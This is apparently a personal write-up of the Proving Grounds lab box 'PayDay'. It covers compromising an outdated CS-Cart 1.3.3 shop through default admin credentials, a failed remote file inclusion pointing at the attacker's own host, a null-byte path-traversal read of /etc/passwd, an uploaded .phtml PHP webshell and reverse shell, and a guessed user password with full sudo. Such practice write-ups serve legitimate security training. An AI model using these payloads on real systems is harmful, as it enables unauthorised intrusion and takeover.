---
machine: PayDay
platform: Proving Grounds
category: Linux
difficulty: Medium
tags: [cs-cart, phtml-upload, lfi, weak-credentials, sudo-misconfiguration]
date: 2026-07-21
status: retired
summary: An aging Ubuntu box running an early-2000s shopping cart application — testing version fingerprinting against a shelf of dated CVEs, an authenticated template-editor file upload to drop a PHP webshell, and a guessable user password that turns out to carry unrestricted sudo rights.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[192.168.45.222]-[~/oscp/payday]
└─$ nmap-full 192.168.163.39              
[*] Running fast port discovery on 192.168.163.39...
[sudo] password for kali: 
[*] Open ports: 22,80,110,139,143,445,993,995
[*] Running full scan on 192.168.163.39...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-21 14:43 -0400
Nmap scan report for 192.168.163.39
Host is up (0.033s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-title: CS-Cart. Powerful PHP shopping cart software
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
110/tcp open  pop3        Dovecot pop3d
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
|_ssl-date: 2026-07-21T18:43:31+00:00; +9s from scanner time.
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_pop3-capabilities: CAPA RESP-CODES UIDL SASL PIPELINING TOP STLS
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: completed LOGIN-REFERRALS OK THREAD=REFERENCES LOGINDISABLEDA0001 MULTIAPPEND IDLE IMAP4rev1 NAMESPACE UNSELECT SASL-IR LITERAL+ STARTTLS Capability CHILDREN SORT
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_ssl-date: 2026-07-21T18:43:31+00:00; +9s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: completed LOGIN-REFERRALS THREAD=REFERENCES OK MULTIAPPEND IDLE IMAP4rev1 NAMESPACE UNSELECT SASL-IR LITERAL+ AUTH=PLAINA0001 Capability CHILDREN SORT
|_ssl-date: 2026-07-21T18:43:31+00:00; +9s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
995/tcp open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: CAPA RESP-CODES UIDL SASL(PLAIN) PIPELINING USER TOP
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
|_ssl-date: 2026-07-21T18:43:31+00:00; +9s from scanner time.
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: PAYDAY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a)
|   Computer name: payday
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: payday
|_  System time: 2026-07-21T14:43:28-04:00
|_clock-skew: mean: 40m08s, deviation: 1h37m58s, median: 8s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.90 seconds
```

The most immediate things I want to look into are the webapp and smb share, I begin to manually enumerate the webapp while feroxbusting it and running enum4linux.

We immediately see our webapp is running CS-Cart, which has several vulnerabilities. We just don't know the version yet:

```text
CS-Cart - Multiple SQL Injections                                                                                                                                                | php/webapps/27030.txt
CS-Cart 1.3.2 - 'index.php' Cross-Site Scripting                                                                                                                                 | php/webapps/31443.txt
CS-Cart 1.3.3 - 'classes_dir' LFI                                                                                                                                                | php/webapps/48890.txt
CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion                                                                                                                              | php/webapps/1872.txt
CS-Cart 1.3.3 - 'install.php' Cross-Site Scripting                                                                                                                               | multiple/webapps/14962.txt
CS-Cart 1.3.3 - authenticated RCE                                                                                                                                                | php/webapps/48891.txt
CS-Cart 1.3.5 - Authentication Bypass                                                                                                                                            | php/webapps/6352.txt
CS-Cart 2.0.0 Beta 3 - 'Product_ID' SQL Injection                                                                                                                                | php/webapps/8184.txt
CS-Cart 2.0.5 - 'reward_points.post.php' SQL Injection                                                                                                                           | php/webapps/33146.txt
CS-Cart 2.2.1 - 'products.php' SQL Injection                                                                                                                                     | php/webapps/36093.txt
CS-Cart 4.2.4 - Cross-Site Request Forgery                                                                                                                                       | php/webapps/36358.html
CS-Cart 4.3.10 - XML External Entity Injection  
```

We can log into the account with default creds: `admin:admin`. Our feroxbust fails as the site is entirely navigated with php via the `index.php?` endpoint.

We can find the version by querying the index.php endpoint with version:

```bash
┌──(kali㉿kali)-[192.168.45.222]-[~/oscp/payday]
└─$ curl http://192.168.163.39/index.php?version
CS-CART: version <b>1.3.3</b>  
```

Upon searching "cs-cart 2006 authenticated rce" we find a google overview summary of the following:

```text
The 2006 Remote Code Execution (RCE) vulnerability in CS-Cart corresponds to **CVE-2006-2863** (also categorized as a Remote File Inclusion or RFI flaw). It affects **CS-Cart 1.3.3**, allowing attackers to execute arbitrary code
```

From an exploit-db article about this cve we see the following:

```text
Expl:

http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=[evil_scripts]
```

However when we try this we get: `http://192.168.163.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=http://192.168.45.222:9999/simple.php`

```text
**Warning**: require_once() [[function.require-once](http://192.168.163.39/classes/phpmailer/function.require-once)]: URL file-access is disabled in the server configuration in **/var/www/classes/phpmailer/class.cs_phpmailer.php** on line **4**  
  
**Warning**: require_once(http://192.168.45.222:9999/simple.phpphpmailerDSclass.phpmailer.php) [[function.require-once](http://192.168.163.39/classes/phpmailer/function.require-once)]: failed to open stream: no suitable wrapper could be found in **/var/www/classes/phpmailer/class.cs_phpmailer.php** on line **4**  
  
**Fatal error**: require_once() [[function.require](http://192.168.163.39/classes/phpmailer/function.require)]: Failed opening required 'http://192.168.45.222:9999/simple.phpphpmailerDSclass.phpmailer.php' (include_path='.:/usr/share/php:/usr/share/pear') in **/var/www/classes/phpmailer/class.cs_phpmailer.php** on line **4**
```

So we go down the list of exploits until we reach the LFI exploit. NOTE: I tried this without the nullbyte and it DOES NOT work. Ensure that you end your LFI with %00.

```text
http://192.168.163.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../etc/passwd%00

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh dhcp:x:100:101::/nonexistent:/bin/false syslog:x:101:102::/home/syslog:/bin/false klog:x:102:103::/home/klog:/bin/false mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false dovecot:x:104:111:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false postfix:x:105:112::/var/spool/postfix:/bin/false sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash  
**Fatal error**: Class 'PHPMailer' not found in **/var/www/classes/phpmailer/class.cs_phpmailer.php** on line **6**
```

This is cool but I'm not entirely sure what to use it for at this moment. Typically a good use of this would be slowly crawling around the filesystem trying to find a users private key to ssh in. While this is not a bad idea, I found another exploit which claims authenticated php execution via unsanitized `.phtml` extension in the /skins/ directory by uploading a malicious script in the templates section which you can find in the admin.php portal.

## Foothold

I go to `http://192.168.163.39/admin.php?target=template_editor` and upload my `simple.phtml` file which simply contains the following php code for a webshell:

```php
<?php system($_GET[cmd]); ?>
```

We can now curl our file with ?cmd= for webshell execution:

```bash
──(kali㉿kali)-[192.168.45.222]-[~/oscp/payday]
└─$ curl http://192.168.163.39/skins/simple.phtml?cmd=whoami
www-data
```

Because I'd like a shell I'm going to base64 encode a bash shell into the webshell and catch it in a penelope listener.

I was having some trouble passing a bash shell through the webshell so I ended up using Ivan Sincek's php revshell as a `.phtml` file to the webapp to establish a shell as the webapp user.

```bash
www-data@payday:/var/www/skins$ whoami
www-data
```

When running `ps auxww` to enumerate processes we see:

```bash
mysql     4583  0.0  3.5 128020 18064 ?        Sl   15:09   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/mysqld.sock

root      4543  0.0  0.1   1756   532 ?        S    15:09   0:00 /bin/sh /usr/bin/mysqld_safe
```

This suggests that we have a database running on the internal port 3306. We will see if we can confirm this when we enumerate our listening ports.

Surely enough we see a locally hosted database on 127.0.0.1:3306:

```bash
www-data@payday:/var/www/skins$ /sbin/ss -tulnp
Netid Recv-Q Send-Q                                                                            Local Address:Port                                                                              Peer Address:Port 
tcp   0      0                                                                                             *:993                                                                                          *:*     
tcp   0      0                                                                                             *:995                                                                                          *:*     
tcp   0      0                                                                                     127.0.0.1:3306                                                                                         *:*     
tcp   0      0                                                                                             *:139                                                                                          *:*     
tcp   0      0                                                                                             *:110                                                                                          *:*     
tcp   0      0                                                                                             *:143                                                                                          *:*     
tcp   0      0                                                                                            :::80                                                                                          :::*      users:(("sh",5038,3),("bash",5039,3),("python",5067,3),("bash",5068,3),("ss",5079,3))
tcp   0      0                                                                                            :::22                                                                                          :::*     
tcp   0      0                                                                                             *:445                                                                                          *:*
```

## Privilege Escalation

I got stuck here and admittedly needed to refer to a writeup. I couldn't seem to find a way to get creds to access the locally hosted mysql database. But it turns out that the intended method was actually just guessing patrick's password!!

You can do this via hydra or manually, eventually when you try `patrick:patrick` you will see that you gain shell access to him and can then run `sudo -l` and find that he has full sudo access (crazy).

And after the attack chain of guessing passwords to full sudo access, you can read the sudo read the /root/proof.txt flag to solve the box.
